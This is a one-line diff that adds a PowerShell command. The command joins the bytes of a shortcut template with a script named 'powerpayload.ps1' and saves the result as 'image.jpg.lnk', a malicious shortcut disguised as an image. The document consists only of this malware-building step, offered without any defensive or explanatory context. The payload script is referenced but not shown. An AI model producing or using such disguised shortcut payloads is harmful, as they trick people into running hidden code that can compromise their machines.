@@ -1,0 +1,1 @@
+(Get-Content -Encoding Byte .\plantilla.lnk)+(Get-Content -Encoding Byte .\powerpayload.ps1)| Set-Content -Encoding Byte -Path .\image.jpg.lnk
